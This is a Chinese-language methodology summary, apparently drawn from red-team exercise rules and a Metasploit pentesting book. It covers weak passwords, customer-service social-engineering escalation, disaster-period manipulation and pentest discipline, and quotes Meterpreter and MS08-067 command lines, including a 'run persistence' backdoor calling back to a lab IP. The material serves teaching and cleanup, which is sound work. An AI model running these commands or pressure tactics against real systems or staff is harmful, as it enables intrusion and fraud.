## I — 方法论骨架 (Interpretation)

**攻防演习规则硬性边界** — 紫队组织方明确划定攻击红线：①限定攻击目标但不限定攻击路径（鼓励发现更多路径）②除授权外不允许 DoS（SYN FLOOD/CC 等）③网页篡改需报备 ④攻击方木马使用要求（限定功能/不能留后门/演习后清除）⑤禁止收买防守方人员 ⑥禁止物理入侵、截断监听外部光纤 ⑦禁止无线电干扰等直接影响目标系统运行的方式。违反将触发非法攻击阻断及通报。

**弱口令与凭证复用导致的连锁沦陷（反例）** — 弱口令是蓝队 90%+ 攻陷率的来源。三类典型反例：①员工用 Zhangsan123/生日/手机后 6 位等简单变形，字典爆破即可拿下 ②员工在多个网站用同一密码（已被泄露进黑产库），凭证复用可轻而易举扩展至内网业务系统 ③管理员用同一套密码管理多台服务器，一台被攻陷窃取密码后扩展至多台甚至域控。本质是"密码习惯+凭证复用"放大单点失陷的影响范围。
- **执行步骤**（防守方规避）:
  1. 禁用空口令与系统缺省口令
  2. 口令长度 ≥8 字符，不连续/重复字符
  3. 口令不含本人/父母/子女/配偶姓名、生日、纪念日期、登录名、E-mail 地址、字典单词
  4. 90 天内更换一次口令
  5. 高权账户强制双因子认证
  6. 禁止同一密码管理多台服务器（用密码管理器+每次生成独立密码）
  7. 内网业务系统启用 SSO 验证，避免凭证复用

**钓鱼邮件冒充客服突破心理防线的社工升级战术（反例）** — 单点社工（冒充客户投毒）失败后，攻击队用"多人协作 + 轮番轰炸 + 报工号 + 投诉威胁"四招升级突破客服心理防线。教训是：①员工单点安全意识再强也抗不住持续社工施压 ②客服类岗位有"客户至上"业务 KPI 与"安全拒绝"的内在冲突 ③单纯靠员工"拒绝接收不明文件"不足以防御，必须有技术管控（如强制杀毒扫描/隔离附件/邮件网关拦截）+ 流程管控（如允许客服上报后由安全人员接管）。
- **执行步骤**（防守方规避）:
  1. 客服平台强制对附件做沙箱扫描，发现木马自动拦截
  2. 客服流程增加"客户投诉威胁"上报安全人员的通道
  3. 客服 KPI 与安全拒绝行为解绑（不让员工因拒绝可疑文件被投诉扣分）
  4. 多人协作异常行为检测（同一客服被多账号轮番投诉时自动告警）
  5. 客服终端部署 EDR，运行任何附件前先沙箱执行

**反例——灾难期"狮子咆哮"恶意社工战术** — 作者用狮子朝地面咆哮制造混乱捕猎的类比，揭示恶意社会工程人员在灾难期（911/海地地震/亚洲海啸）的攻击模式——利用人们脆弱无助时的情感迷惑，在帮助寻找逝去亲人的网站上伪装受害者，或声称自己在灾难中失去家人朋友。情感被迷惑时目标无法识破攻击。毫无经验的受害者首先会给出少量信息，攻击者据此找到攻击入口，再发动更险恶的攻击。这套反例限制 CU-2-08「影响五原则」和 CU-2-09「操纵六法」中"强烈情绪反应"的伦理边界——专业审计人员绝不使用灾难期情感操纵，但必须培训客户识别此类恶意策略。

**反例汇总——PTES 攻击纪律 + persistence 清理 + Target 手动选择** — 作者明确警告渗透测试的三个核心纪律反例：①**无目的渗透尝试是痴心妄想**——大量尝试模块期待奇迹出现 shell 不仅浪费时间，还会触发大量报警，对客户组织的安全运营造成干扰，违反渗透测试专业纪律。正确做法是先用情报搜集和漏洞分析阶段确认目标存在具体漏洞，深入研究并测试后再实施针对性攻击；②**MS08-067 不要依赖 Automatic Targeting**——该漏洞依赖硬编码内存地址，对操作系统版本/补丁/语言/DEP 设置高度敏感，Automatic Targeting 经常识别错误，一旦 target 选错触发的不是正确溢出代码而是错误的破坏性攻击，会导致远程服务崩溃甚至系统蓝屏，触发大量报警暴露渗透行为；③**persistence 脚本必须移除**——该脚本在 `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` 下添加开机自启键并上传 VBScript 到 `C:\WINDOWS\TEMP\`，测试完成后必须手工删除注册表键和 VBScript 文件，否则任何后续攻击者都可以无须认证获取系统访问权——等于给客户留了一个公开后门。

- **方法论的使用**: 作者明确警告渗透测试的三个核心纪律反例：①**无目的渗透尝试是痴心妄想**——大量尝试模块期待奇迹出现 shell 不仅浪费时间，还会触发大量报警，对客户组织的安全运营造成干扰，违反渗透测试专业纪律。正确做法是先用情报搜集和漏洞分析阶段确认目标存在具体漏洞，深入研究并测试后再实施针对性攻击；②**MS08-067 不要依赖 Automatic Targeting**——该漏洞依赖硬编码内存地址，对操作系统版本/补丁/语言/DEP 设置高度敏感，Automatic Targeting 经常识别错误，一旦 target 选错触发的不是正确溢出代码而是错误的破坏性攻击，会导致远程服务崩溃甚至系统蓝屏，触发大量报警暴露渗透行为；③**persistence 脚本必须移除**——该脚本在 `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` 下添加开机自启键并上传 VBScript 到 `C:\WINDOWS\TEMP\`，测试完成后必须手工删除注册表键和 VBScript 文件，否则任何后续攻击者都可以无须认证获取系统访问权——等于给客户留了一个公开后门。
- **结果**: 【亲历】第 5 章示例——nmap 确认 Windows XP Professional SP2 后手动 `set TARGET 3`（Page 89-90）；【亲历】第 6 章示例——`run persistence -X -i 50 -p 443 -r 192.168.33.129` 添加了 `HKLM\...\Run\xEYnaHedooc` 键和 VBScript 文件（Page 122）。

## E — 执行步骤 (Execution)

### 攻防演习规则硬性边界

1. 演习开始前组织方明确划定红线（目标/路径/DoS/篡改/木马/物理/无线电）
  2. 攻击方所有操作通过演习平台记录、审计
  3. 指挥部组织技术支持单位对攻击全流量记录、分析
  4. 发现违规行为 → 阻断非法攻击 → 转人工处置 → 对攻击团队通报

### 反例——灾难期"狮子咆哮"恶意社工战术

1. 识别灾难期攻击信号：灾难发生后出现"帮助寻找亲人""我是受害者"类网站/邮件/电话 → 触发警觉
  2. 培训客户识别：在安全意识培训中加入灾难期社工案例 → 员工知道此类攻击模式
  3. 验证渠道：通过官方渠道核实求助者身份 → 不在情感驱动下提供信息
  4. 监控异常：灾难发生后加强对异常邮件/网站/电话的监控 → 早期发现攻击

### 反例汇总——PTES 攻击纪律 + persistence 清理 + Target 手动选择

1. 攻击纪律：情报搜集阶段已识别目标端口/服务/版本 → 漏洞分析阶段用 nmap 脚本（如 `--script=smb-check-vulns`）或扫描器确认具体漏洞存在 → 在测试环境验证 exploit 模块可用 → 实施攻击（不碰运气）
  2. Target 手动选择：用 nmap `-A` 或 `smb_version` 扫描准确识别目标操作系统（包括 SP 版本和语言）→ `show targets` 查看模块支持的所有目标 → 手动 `set TARGET <对应 ID>`，不依赖 Automatic（target 0）→ 在测试环境验证 target 选择正确
  3. persistence 清理：测试期间使用 `run persistence -X -i 50 -p 443 -r 192.168.33.129` → 立即记录添加的注册表键名（每次随机，如 `xEYnaHedooc`）→ 测试结束后删除注册表键 `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\<随机键名>` → 删除 VBScript 文件 `C:\WINDOWS\TEMP\<随机文件名>.vbs` → 验证删除完成

## B — 失效与边界 (Boundary)

- **攻防演习规则硬性边界**：规则不清晰 → 攻击队打擦边球导致纠纷；全流量未记录 → 违规行为无法追溯；违规后只阻断不通报 → 攻击队重复违规。
- **弱口令与凭证复用导致的连锁沦陷（反例）**：仅靠员工自觉 → 弱口令反复出现；只改密码不查历史泄露 → 已泄露密码仍在黑产库流通；只做单点强口令不做凭证隔离 → 一台被攻陷仍可横向。
- **钓鱼邮件冒充客服突破心理防线的社工升级战术（反例）**：只靠员工安全意识培训 → 1 小时拉锯后心理防线仍被攻破；只做单点拦截不做多人协作异常检测 → 攻击队轮番轰炸无人察觉。
- **反例——灾难期"狮子咆哮"恶意社工战术**：灾难期情感迷惑让员工放弃判断；"帮助寻找亲人"类网站看似公益难以拒绝；员工因同情而提供少量信息，攻击者据此找到入口。
- **反例汇总——PTES 攻击纪律 + persistence 清理 + Target 手动选择**：跳过漏洞分析直接打会触发大量报警；目标存在未预期的安全防护使攻击失败；错误的 TARGET 导致服务崩溃甚至蓝屏；DEP 设置判断错误导致溢出代码无法执行；语言版本判断错误（如 Japanese 误为 English）导致硬编码地址不匹配；忘记移除 persistence 会给客户留永久后门；注册表键名每次随机不记录会找不到要删的键；只删文件不删注册表键会在下次启动时报错。
